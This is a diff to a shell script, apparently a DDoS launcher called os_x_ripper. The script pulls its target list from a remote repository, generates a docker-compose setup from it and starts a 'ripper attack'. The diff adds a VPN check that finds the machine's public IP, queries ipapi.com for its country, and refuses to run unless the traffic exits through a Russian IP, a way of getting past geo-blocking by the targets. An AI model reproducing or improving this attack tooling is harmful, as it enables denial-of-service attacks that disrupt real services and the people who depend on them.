@@ -6,6 +6,7 @@
 
 VERSION='2.1'
 TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
+CHECK_VPN_API_URL='https://ipapi.com/ip_api.php?ip='
 
 function print_help {
   echo -e "Usage: os_x_ripper.sh --mode install"
@@ -54,6 +55,21 @@ function generate_compose {
     done < targets.txt
 }
 
+# https://ipapi.com/ip_api.php?ip=
+# Used for country code check.
+function check_vpn_status {
+  ip=$(dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com)
+  ip=`sed -e 's/^"//' -e 's/"$//' <<<"$ip"`
+  code=$(curl --silent ${CHECK_VPN_API_URL}${ip} | python -c 'import json,sys;obj=json.load(sys.stdin);print obj["country_code"]')
+  
+  if [ "$code" != "RU" ]; then
+    red=`tput setaf 1`
+    reset=`tput sgr0`
+    echo "${red}Warning: Please use VPN country which are in this list: RU and e.t.c${reset}"
+    exit 1
+  fi
+}
+
 function ripper_start {
   echo "Starting ripper attack"
   docker-compose up -d
@@ -95,9 +111,11 @@ check_params
 case $mode in
   install)
     generate_compose
+    check_vpn_status
     ripper_start
     ;;
   start)
+    check_vpn_status
     ripper_start
     ;;
   stop)
@@ -106,7 +124,11 @@ case $mode in
   reinstall)
     ripper_stop
     generate_compose
+    check_vpn_status
     ripper_start
+    ;;
+  vpncheck)
+    check_vpn_status
     ;;
   *)
     echo "Wrong mode"
